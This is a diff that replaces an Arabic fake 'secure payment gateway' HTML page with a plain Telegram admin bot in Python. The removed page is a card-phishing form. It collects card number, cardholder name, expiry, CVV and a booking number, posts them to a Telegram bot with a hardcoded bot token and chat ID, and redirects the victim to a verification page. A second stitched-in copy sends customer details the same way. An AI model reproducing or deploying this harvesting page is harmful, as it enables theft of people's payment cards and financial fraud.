@@ -1,262 +1,232 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>بوابة الدفع الآمنة</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      direction: rtl;
-      background-color: #f5f5f5;
-      margin: 0;
-      padding: 0;
-    }
-    header, footer {
-      background-color: #004080;
-      color: white;
-      text-align: center;
-      padding: 20px 0;
-    }
-    main {
-      padding: 20px;
-    }
-    form {
-      background-color: white;
-      padding: 20px;
-      border-radius: 8px;
-      max-width: 500px;
-      margin: auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    label {
-      display: block;
-      margin-top: 10px;
-    }
-    input, select {
-      width: 100%;
-      padding: 8px;
-      margin-top: 5px;
-      box-sizing: border-box;
-    }
-    .error-message {
-      color: red;
-      font-size: 14px;
-      display: none;
-      margin-top: 10px;
-    }
-    button {
-      margin-top: 20px;
-      padding: 10px;
-      width: 100%;
-      background-color: #004080;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      font-size: 16px;
-    }
-    .card-logos {
-      display: flex;
-      justify-content: center;
-      gap: 20px;
-    }
-    .card-logos img {
-      height: 50px;
-    }
-  </style>
-</head>
-<body>
+# bot.py
+# متوافق مع python-telegram-bot v20+
+import os
+import asyncio
+import logging
+import json
+from pathlib import Path
 
-  <header>
-    <div class="card-logos">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa Logo" />
-      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard Logo" />
-    </div>
-  </header>
+from telegram import Update
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    ContextTypes,
+    PicklePersistence
+)
 
-  <main>
-    <form id="paymentForm">
+# ====== إعدادات ======
+# ضع التوكن كمتغير بيئة BOT_TOKEN (لا تضع التوكن داخل الكود)
+BOT_TOKEN = os.getenv("BOT_TOKEN", "")
+if not BOT_TOKEN:
+    raise SystemExit("ERROR: BOT_TOKEN environment variable is required. Generate a new token from BotFather and export BOT_TOKEN.")
 
-      <label for="confirmBooking">تأكيد رقم الحجز (6 أرقام):</label>
-      <input type="text" id="confirmBooking" minlength="6" maxlength="6" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+# Admin (Owner) ID — المستخدم الذي أعطيته
+OWNER_ID = 16420566
 
-      <p id="lengthError" class="error-message">
-        ❗ رقم الحجز يجب أن يتكون من 6 أرقام فقط.
-      </p>
+# ملف حفظ الحالة (admins, banned, etc)
+DATA_FILE = Path("bot_data.json")
 
-      <label for="cardNumber">رقم البطاقة (مثل: 1234-5678-9012-3456):</label>
-      <input type="text" id="cardNumber" maxlength="19" required oninput="formatCardNumber(this)" />
+# مهيئ السجل
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-      <label for="cardName">الاسم الموجود على البطاقة:</label>
-      <input type="text" id="cardName" required />
+# ====== دوال المساعدة للعمل مع ملف البيانات ======
+def load_data():
+    if DATA_FILE.exists():
+        with DATA_FILE.open("r", encoding="utf-8") as f:
+            return json.load(f)
+    # بنية البداية
+    return {"admins": [OWNER_ID], "banned": []}
 
-      <label for="expiryMonth">الشهر (MM):</label>
-      <select id="expiryMonth" required>
-        <option value="">--</option>
-        <option>01</option><option>02</option><option>03</option>
-        <option>04</option><option>05</option><option>06</option>
-        <option>07</option><option>08</option><option>09</option>
-        <option>10</option><option>11</option><option>12</option>
-      </select>
+def save_data(data):
+    with DATA_FILE.open("w", encoding="utf-8") as f:
+        json.dump(data, f, ensure_ascii=False, indent=2)
 
-      <label for="expiryYear">السنة (YYYY):</label>
-      <select id="expiryYear" required>
-        <option value="">--</option>
-        <option>2025</option><option>2026</option><option>2027</option>
-        <option>2028</option><option>2029</option><option>2030</option>
-        <option>2031</option><option>2032</option><option>2033</option>
-        <option>2034</option><option>2035</option><option>2036</option>
-        <option>2037</option><option>2038</option><option>2039</option>
-        <option>2040</option>
-      </select>
+# ====== handlers ======
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    data = load_data()
+    if user.id in data.get("banned", []):
+        await update.message.reply_text("حسابك محظور من استخدام هذا البوت.")
+        return
+    if user.id in data.get("admins", []):
+        await update.message.reply_text("أهلاً أيها الأدمن ✅\nاستخدم /help لرؤية الأوامر.")
+    else:
+        await update.message.reply_text("أهلاً بك! هذا بوت خاص — لا تملك صلاحيات إدارية.")
 
-      <label for="cvv">CVV (3 أرقام):</label>
-      <input type="text" id="cvv" minlength="3" maxlength="3" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    data = load_data()
+    if update.effective_user.id not in data.get("admins", []):
+        await update.message.reply_text("عذراً، هذه الأوامر مخصصة للمشرفين فقط.")
+        return
+    txt = (
+        "قائمة الأوامر الإدارية:\n\n"
+        "/start - بدء\n"
+        "/help - هذه الرسالة\n"
+        "/status - حالة البوت\n"
+        "/admins - قائمة الأدمن\n"
+        "/add_admin <id> - إضافة أدمن\n"
+        "/remove_admin <id> - إزالة أدمن\n"
+        "/ban <id> - حظر مستخدم\n"
+        "/unban <id> - فك الحظر\n"
+        "/broadcast <message> - بث رسالة للمستخدمين (حاليًا يرسل فقط للأدمنز)\n"
+        "/shutdown - إيقاف البوت (للـ owner فقط)\n"
+    )
+    await update.message.reply_text(txt)
 
-      <p id="dateError" class="error-message">
-        ❗ لأسباب أمنية، لا يمكننا قبول بطاقات منتهية الصلاحية.  
-        نحتفظ بحق رفض المعاملة لحمايتك من الاحتيال.
-      </p>
+async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    data = load_data()
+    await update.message.reply_text(f"البوت يعمل ✅\nعدد الأدمن: {len(data.get('admins',[]))}")
 
-      <button type="submit">ادفع الآن</button>
-    </form>
-  </main>
+async def admins_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    data = load_data()
+    admins = data.get("admins", [])
+    await update.message.reply_text("قائمة الأدمن:\n" + "\n".join(map(str, admins)))
 
-  <footer>
-    جميع الحقوق محفوظة © 2025
-  </footer>
+def is_owner(user_id: int):
+    return user_id == OWNER_ID
 
-  <script>
-    function formatCardNumber(input) {
-      let value = input.value.replace(/[^0-9]/g, "");
-      value = value.slice(0, 16);
-      let formatted = value.match(/.{1,4}/g);
-      input.value = formatted ? formatted.join("-") : "";
-    }
+async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    data = load_data()
+    if user.id not in data.get("admins", []):
+        await update.message.reply_text("فقط الأدمنز يمكنهم استخدام هذا الأمر.")
+        return
+    if not context.args:
+        await update.message.reply_text("استخدام: /add_admin <user_id>")
+        return
+    try:
+        new_id = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("أدخل رقم معرّف صحيح.")
+        return
+    if new_id in data["admins"]:
+        await update.message.reply_text("هذا المستخدم موجود بالفعل كأدمن.")
+        return
+    data["admins"].append(new_id)
+    save_data(data)
+    await update.message.reply_text(f"تمت إضافة الأدمن: {new_id}")
 
-    document.getElementById("paymentForm").addEventListener("submit", function(e) {
-      e.preventDefault();
+async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    data = load_data()
+    if user.id not in data.get("admins", []):
+        await update.message.reply_text("فقط الأدمنز يمكنهم استخدام هذا الأمر.")
+        return
+    if not context.args:
+        await update.message.reply_text("استخدام: /remove_admin <user_id>")
+        return
+    try:
+        rid = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("أدخل رقم معرّف صحيح.")
+        return
+    if rid == OWNER_ID:
+        await update.message.reply_text("لا يمكنك إزالة الـ owner.")
+        return
+    if rid not in data["admins"]:
+        await update.message.reply_text("هذا المستخدم ليس أدمن.")
+        return
+    data["admins"].remove(rid)
+    save_data(data)
+    await update.message.reply_text(f"تمت إزالة الأدمن: {rid}")
 
-      const confirmBooking = document.getElementById("confirmBooking").value;
-      const lengthError = document.getElementById("lengthError");
-      const dateError = document.getElementById("dateError");
+async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    data = load_data()
+    if user.id not in data.get("admins", []):
+        await update.message.reply_text("فقط الأدمنز يمكنهم استخدام هذا الأمر.")
+        return
+    if not context.args:
+        await update.message.reply_text("استخدام: /ban <user_id>")
+        return
+    try:
+        uid = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("أدخل رقم معرّف صحيح.")
+        return
+    if uid in data.get("banned", []):
+        await update.message.reply_text("الحساب محظور بالفعل.")
+        return
+    data.setdefault("banned", []).append(uid)
+    save_data(data)
+    await update.message.reply_text(f"تم حظر: {uid}")
 
-      lengthError.style.display = "none";
-      dateError.style.display = "none";
+async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    data = load_data()
+    if user.id not in data.get("admins", []):
+        await update.message.reply_text("فقط الأدمنز يمكنهم استخدام هذا الأمر.")
+        return
+    if not context.args:
+        await update.message.reply_text("استخدام: /unban <user_id>")
+        return
+    try:
+        uid = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("أدخل رقم معرّف صحيح.")
+        return
+    if uid not in data.get("banned", []):
+        await update.message.reply_text("هذا الحساب غير محظور.")
+        return
+    data["banned"].remove(uid)
+    save_data(data)
+    await update.message.reply_text(f"تم فك الحظر عن: {uid}")
 
-      if (confirmBooking.length !== 6) {
-        lengthError.style.display = "block";
-        return;
-      }
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    data = load_data()
+    if user.id not in data.get("admins", []):
+        await update.message.reply_text("فقط الأدمنز يمكنهم استخدام هذا الأمر.")
+        return
+    if not context.args:
+        await update.message.reply_text("استخدام: /broadcast <message>")
+        return
+    message = " ".join(context.args)
+    # مثال بسيط: نرسل الرسالة لكل الأدمنز فقط (تعديل حسب حاجتك)
+    targets = data.get("admins", [])
+    sent = 0
+    for uid in targets:
+        try:
+            await context.bot.send_message(chat_id=uid, text=f"[Broadcast]\n{message}")
+            sent += 1
+        except Exception as e:
+            logger.warning("Failed to send to %s: %s", uid, e)
+    await update.message.reply_text(f"أرسلت الرسالة إلى {sent} حساب/حسابات.")
 
-      const month = parseInt(document.getElementById("expiryMonth").value);
-      const year = parseInt(document.getElementById("expiryYear").value);
+async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if not is_owner(user.id):
+        await update.message.reply_text("فقط الـ owner يمكنه إيقاف البوت.")
+        return
+    await update.message.reply_text("جاري إيقاف البوت... ✅")
+    # graceful stop
+    asyncio.get_event_loop().stop()
 
-      if (year < 2025 || (year === 2025 && month < 7)) {
-        dateError.style.display = "block";
-        return;
-      }
+# ====== main ======
+def main():
+    data = load_data()
+    # حفظ الملف إن لم يكن موجودًا
+    save_data(data)
 
-      const cardNumber = document.getElementById("cardNumber").value;
-      const cardName = document.getElementById("cardName").value;
-      const cvv = document.getElementById("cvv").value;
+    app = Application.builder().token(BOT_TOKEN).build()
 
-      const message = `
-💳 معلومات عملية الدفع:
-------------------------
-📄 رقم البطاقة: ${cardNumber}
-👤 الاسم على البطاقة: ${cardName}
-📆 تاريخ الانتهاء: ${month}/${year}
-🔐 CVV: ${cvv}
-🔢 رقم الحجز: ${confirmBooking}
-`;
+    # أوامر
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", help_cmd))
+    app.add_handler(CommandHandler("status", status))
+    app.add_handler(CommandHandler("admins", admins_list))
+    app.add_handler(CommandHandler("add_admin", add_admin))
+    app.add_handler(CommandHandler("remove_admin", remove_admin))
+    app.add_handler(CommandHandler("ban", ban_user))
+    app.add_handler(CommandHandler("unban", unban_user))
+    app.add_handler(CommandHandler("broadcast", broadcast))
+    app.add_handler(CommandHandler("shutdown", shutdown))
 
-      fetch("7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: "1642216679",
-          text: message
-        })
-      })
-      .then(() => {
-        window.location.href = "verify.html";
-      })
-      .catch(() => {
-        alert("❌ فشل الإرسال إلى البوت");
-      });
-    });
-  </script>
+    logger.info("Starting bot...")
+    app.run_polling()
 
-</body>
-</html>    }
-    .card-logos {
-      display: flex;
-      justify-content: center;
-      gap: 20px;
-    }
-    .card-logos img {
-      height: 50px;
-    }
-  </style>
-</head>
-<body>
-
-<header>
-  <div class="card-logos">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa Logo" />
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard Logo" />
-  </div>
-</header>
-
-<main>
-  <form id="paymentForm">
-    <label for="confirmBooking">تأكيد رقم الحجز (6 أرقام):</label>
-    <input type="text" id="confirmBooking" minlength="6" maxlength="6" required oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
-
-    <label for="customerName">اسم العميل:</label>
-    <input type="text" id="customerName" required />
-
-    <button type="submit">إرسال إشعار الحجز</button>
-  </form>
-</main>
-
-<footer>
-  جميع الحقوق محفوظة © 2025
-</footer>
-
-<script>
-document.getElementById("paymentForm").addEventListener("submit", function(e) {
-  e.preventDefault();
-
-  const bookingNumber = document.getElementById("confirmBooking").value;
-  const customerName = document.getElementById("customerName").value;
-
-  if (bookingNumber.length !== 6) {
-    alert("❗ رقم الحجز يجب أن يتكون من 6 أرقام فقط.");
-    return;
-  }
-
-  // إرسال رقم الحجز واسم العميل فقط إلى البوت
-  fetch("https://api.telegram.org/bot7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E/sendMessage", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: "1642216679",
-      text: `🔔 حجز جديد:\nرقم الحجز: ${bookingNumber}\nاسم العميل: ${customerName}`
-    })
-  })
-  .then(() => {
-    alert("تم إرسال إشعار الحجز بنجاح!");
-    document.getElementById("paymentForm").reset();
-  })
-  .catch(() => {
-    alert("❌ فشل الإرسال إلى البوت");
-  });
-});
-</script>
-
-</body>
-</html>
+if __name__ == "__main__":
+    main()
